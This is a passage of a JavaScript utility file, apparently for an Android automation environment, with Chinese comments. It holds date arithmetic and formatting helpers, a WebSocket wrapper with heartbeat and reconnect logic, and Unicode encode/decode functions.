    switch (calculationAttribute.toLowerCase()) {
      case "year":
        oldTime.setFullYear(oldTime.getFullYear() + num);
        break;
      case "month":
        oldTime.setMonth(oldTime.getMonth() + num);
        break;
      case "day":
        oldTime.setDate(oldTime.getDate() + num);
        break;
      case "hour":
        oldTime.setHours(oldTime.getHours() + num);
        break;
      case "minute":
        oldTime.setMinutes(oldTime.getMinutes() + num);
        break;
      case "second":
        oldTime.setSeconds(oldTime.getSeconds() + num);
        break;
      default:
        break;
    }
  }
  //获取最终格式化后的 时间
  oldTime = GetFormatDateTime(oldTime);
  //进行对比
  return nowTime > oldTime;
}

/**
 * 格式化时间
 * @param {*} date
 */
function GetFormatDateTime(date) {
  var year = date.getFullYear();
  var month = DateTimePrefixZero(date.getMonth() + 1);
  var day = DateTimePrefixZero(date.getDate());
  var hour = DateTimePrefixZero(date.getHours());
  var minute = DateTimePrefixZero(date.getMinutes());
  var second = DateTimePrefixZero(date.getSeconds());
  var millisecond = DateTimePrefixZero(date.getMilliseconds());
  return (
    year + "/" + month + "/" + day + " " + hour + ":" + minute + ":" + second
  );

  /**
   * 前缀0
   * @param {*} s
   */
  function DateTimePrefixZero(s) {
    if (s < 10) {
      s = "0" + s;
    }
    return s;
  }
}

/**
 * 时间格式化
 */
Date.prototype.Format = function (fmt) {
  var o = {
    "M+": this.getMonth() + 1, // 月份
    "d+": this.getDate(), // 日
    "H+": this.getHours(), // 小时
    "m+": this.getMinutes(), // 分
    "s+": this.getSeconds(), // 秒
    "q+": Math.floor((this.getMonth() + 3) / 3), // 季度
    S: this.getMilliseconds(), // 毫秒
  };
  if (/(y+)/.test(fmt))
    fmt = fmt.replace(
      RegExp.$1,
      (this.getFullYear() + "").substr(4 - RegExp.$1.length)
    );
  for (var k in o)
    if (new RegExp("(" + k + ")").test(fmt))
      fmt = fmt.replace(
        RegExp.$1,
        RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length)
      );
  return fmt;
};

/**
 * 获取当前时间
 */
function GetNowTime() {
  return new Date().Format("yyyy-MM-dd HH:mm:ss");
}

function MySocketHelper() {
  function WebSocketHelper(
    url,
    pingTimeout,
    pongTimeout,
    reconnectTimeout,
    pingMsg,
    repeatLimit
  ) {
    this.opts = {
      url: url,
      pingTimeout: pingTimeout,
      pongTimeout: pongTimeout,
      reconnectTimeout: reconnectTimeout,
      pingMsg: pingMsg,
      repeatLimit: repeatLimit,
    };
    this.ws = null;
    this.repeat = 0;

    //override hook function
    this.onClose = () => {};
    this.onError = () => {};
    this.onOpen = () => {};
    this.onMessage = () => {};
    this.onData = () => {};
    this.onReconnect = () => {};
    this.createWebSocket();
  }

  WebSocketHelper.prototype.createWebSocket = function () {
    try {
      this.ws = web.newWebSocket(this.opts.url, { eventThread: "this" });
      this.initEventHandle();
    } catch (e) {
      this.reconnect();
      console.warn("Socket createWebSocket 异常: " + e);
    }
  };

  WebSocketHelper.prototype.initEventHandle = function () {
    this.ws.on("closed", (code, reason, ws) => {
      //console.warn("closed")
      this.onClose(code, reason, ws);
      this.reconnect();
    });

    // this.ws.on('closing', (code, reason, ws) => {
    //     //console.warn("closing")
    //     this.onClose(code,reason,ws);
    //     this.reconnect();
    // });

    this.ws.on("failure", (err, res, ws) => {
      //console.warn("failure")
      this.onError(err, res, ws);
      this.reconnect();
    });

    this.ws.on("error", (err, res, ws) => {
      //console.warn("error")
      this.onError(err, res, ws);
      this.reconnect();
    });

    this.ws.on("open", (res, ws) => {
      //console.warn("open")
      this.repeat = 0;
      this.onOpen(res, ws);
      this.heartCheck();
    });

    this.ws.on("text", (event, ws) => {
      //console.warn("text")
      this.onMessage(event, ws);
      this.heartCheck();
    });

    this.ws.on("binary", (bytes, ws) => {
      //console.warn("binary")
      this.onData(bytes, ws);
      this.heartCheck();
    });
  };

  WebSocketHelper.prototype.reconnect = function () {
    //console.warn("reconnect")
    if (this.opts.repeatLimit > 0 && this.opts.repeatLimit <= this.repeat)
      return; //limit repeat the number
    if (this.lockReconnect || this.forbidReconnect) return;

    this.lockReconnect = true;
    this.repeat++; //必须在lockReconnect之后，避免进行无效计数
    this.onReconnect();
    //没连接上会一直重连，设置延迟避免请求过多
    setTimeout(() => {
      if (this.ws) {
        this.ws = null;
      }

      this.createWebSocket();
      this.lockReconnect = false;
    }, this.opts.reconnectTimeout);
  };

  WebSocketHelper.prototype.send = function (msg) {
    //console.warn("send")
    this.ws.send(msg);
  };

  //心跳检测
  WebSocketHelper.prototype.heartCheck = function () {
    this.heartReset();
    this.heartStart();
  };

  WebSocketHelper.prototype.heartStart = function () {
    if (this.forbidReconnect) return; //不再重连就不再执行心跳

    this.pingTimeoutId = setTimeout(() => {
      //这里发送一个心跳，后端收到后，返回一个心跳消息，
      //onmessage拿到返回的心跳就说明连接正常
      this.ws.send(this.opts.pingMsg);
      //如果超过一定时间还没重置，说明后端主动断开了
      this.pongTimeoutId = setTimeout(() => {
        //如果onclose会执行reconnect，我们执行ws.close()就行了.如果直接执行reconnect 会触发onclose导致重连两次
        this.ws.close(1000, null); //1000表示正常关闭
      }, this.opts.pongTimeout);
    }, this.opts.pingTimeout);
  };

  WebSocketHelper.prototype.heartReset = function () {
    if (this.pingTimeoutId) {
      clearTimeout(this.pingTimeoutId);
    }

    if (this.pongTimeoutId) {
      clearTimeout(this.pongTimeoutId);
    }
  };

  WebSocketHelper.prototype.close = function () {
    //如果手动关闭连接，不再重连
    this.forbidReconnect = true;
    this.heartReset();
    this.ws.close(1000, null); //1000表示正常关闭
  };
  return WebSocketHelper;
}

// Unicode 编码
function EncodeUnicode(str) {
  var res = [];
  for (var i = 0; i < str.length; i++) {
    res[i] = ("00" + str.charCodeAt(i).toString(16)).slice(-4);
  }
  return "\\u" + res.join("\\u");
}

// Unicode 解码
// function DecodeUnicode(str) {
//   str = str.replace(/\\/g, "%");
//   return unescape(str);
// }
function DecodeUnicode(str) {
  return unescape(str.replace(/\u/g, "%u"));
}
